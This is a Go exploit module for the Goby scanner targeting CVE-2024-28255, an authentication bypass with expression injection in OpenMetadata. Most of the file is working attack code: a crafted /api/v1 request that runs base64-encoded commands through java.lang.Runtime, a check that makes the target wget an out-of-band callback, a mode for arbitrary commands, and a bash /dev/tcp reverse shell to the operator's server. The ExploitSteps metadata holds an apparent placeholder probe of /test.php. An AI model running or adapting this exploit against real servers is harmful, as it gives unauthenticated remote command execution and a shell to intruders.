package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "OpenMetadata /api/v1 Command Execution Vulnerability (CVE-2024-28255)",
    "Description": "<p>OpenMetadata is a unified discovery, observability and governance platform powered by a central metadata repository, deep lineage and seamless team collaboration.</p><p>A security vulnerability exists in OpenMetadata, which results from a filter returning a JWT without validating it when the requested path contains any excluded endpoints. An unauthenticated remote attacker can exploit this vulnerability to execute commands remotely and gain server privileges.</p>",
    "Product": "OpenMetadata",
    "Homepage": "https://open-metadata.org/",
    "DisclosureDate": "2024-04-18",
    "PostTime": "2024-04-18",
    "Author": "mayuze@baimaohui.net",
    "FofaQuery": "body=\"OpenMetadata Application\" && body=\"OpenMetadata\"",
    "GobyQuery": "body=\"OpenMetadata Application\" && body=\"OpenMetadata\"",
    "Level": "3",
    "Impact": "<p>A security vulnerability exists in OpenMetadata, which results from a filter returning a JWT without validating it when the requested path contains any excluded endpoints. An unauthenticated remote attacker can exploit this vulnerability to execute commands remotely and gain server privileges.</p>",
    "Recommendation": "<p>Currently, these vulnerabilities have been fixed, and affected users can upgrade to OpenMetadata 1.2.4 or higher.</p><p>Download link:</p><p><a href=\"https://github.com/open-metadata/OpenMetadata/releases\">https://github.com/open-metadata/OpenMetadata/releases</a></p>",
    "References": [
        "https://blog.csdn.net/KKleeeaa/article/details/137617816"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "Reverse,Command",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "id",
            "show": "attackType=Command"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(%22cGluZyAtYyAxIDZiNGZlYzM2LmRuc2xvZy5iaXo=%22)))",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "400",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "java.lang.ProcessImpl",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-28255"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "OpenMetadata /api/v1 命令执行漏洞 (CVE-2024-28255)",
            "Product": " OpenMetadata",
            "Description": "<p>OpenMetadata是一个统一的发现、可观察和治理平台，由中央元数据存储库、深入的沿袭和无缝团队协作提供支持。&nbsp;</p><p>OpenMetadata存在安全漏洞，该漏洞源于当请求的路径包含任何排除的端点时，过滤器将返回而不验证 JWT。导致未经身份验证的远程攻击者可以利用该漏洞远程命令执行，获取服务器权限。<br></p>",
            "Recommendation": "<p>目前这些漏洞已经修复，受影响用户可升级到OpenMetadata 1.2.4或更高版本。</p><p>下载链接：</p><p><a href=\"https://github.com/open-metadata/OpenMetadata/releases\">https://github.com/open-metadata/OpenMetadata/releases</a></p>",
            "Impact": "<p>OpenMetadata存在安全漏洞，该漏洞源于当请求的路径包含任何排除的端点时，过滤器将返回而不验证 JWT。导致未经身份验证的远程攻击者可以利用该漏洞远程命令执行，获取服务器权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "OpenMetadata /api/v1 Command Execution Vulnerability (CVE-2024-28255)",
            "Product": "OpenMetadata",
            "Description": "<p>OpenMetadata is a unified discovery, observability and governance platform powered by a central metadata repository, deep lineage and seamless team collaboration.<br></p><p>A security vulnerability exists in OpenMetadata, which results from a filter returning a JWT without validating it when the requested path contains any excluded endpoints. An unauthenticated remote attacker can exploit this vulnerability to execute commands remotely and gain server privileges.<br></p>",
            "Recommendation": "<p>Currently, these vulnerabilities have been fixed, and affected users can upgrade to OpenMetadata 1.2.4 or higher.</p><p>Download link:</p><p><a href=\"https://github.com/open-metadata/OpenMetadata/releases\">https://github.com/open-metadata/OpenMetadata/releases</a></p>",
            "Impact": "<p>A security vulnerability exists in OpenMetadata, which results from a filter returning a JWT without validating it when the requested path contains any excluded endpoints. An unauthenticated remote attacker can exploit this vulnerability to execute commands remotely and gain server privileges.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10944"
}`

	var runCommandAdufcnadf34123OI878 = func(u *httpclient.FixUrl, cmd string) error {
		cmd = base64.StdEncoding.EncodeToString([]byte(cmd))
		uri := `/api/v1`
		payload := `;v1%2fusers%2flogin/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(%22` + cmd + `%22)))`
		//payload = url.QueryEscape(payload)
		cfg := httpclient.NewGetRequestConfig(uri + payload)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return err
		}
		if resp.StatusCode != 400 {
			return fmt.Errorf("response code is not 400")
		}
		if !strings.Contains(resp.Utf8Html, `java.lang.ProcessImpl`) {
			return errors.New(`command exec failed`)
		}
		return nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := "wget " + checkUrl
			err := runCommandAdufcnadf34123OI878(u, cmd)
			if err != nil {
				return false
			}
			if !godclient.PullExists(checkStr, time.Second*15) {
				return false
			}
			ss.VulURL = u.FixedHostInfo + "/api/v1"
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			if attackType == "Reverse" {
				waitSessionCh := make(chan string)
				//rp就是拿到的监听端口
				rp, err := godclient.WaitSession("reverse_linux", waitSessionCh)
				if err != nil || len(rp) == 0 {
					expResult.Success = false
					expResult.Output = "godclient bind failed"
					return expResult
				}
				ip := godclient.GetGodServerIP()
				command := `/bin/bash -c bash$IFS$9-i>&/dev/tcp/` + ip + `/` + rp + `<&1`
				go runCommandAdufcnadf34123OI878(expResult.HostInfo, command)
				//检测为固定格式
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 15):
				}
			}

			command := ss.Params["Command"].(string)
			if attackType == "Command" {
				err := runCommandAdufcnadf34123OI878(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = "命令已成功执行，但该漏洞无法回显，请自行确认"
				return expResult
			}

			return expResult
		},
	))
}
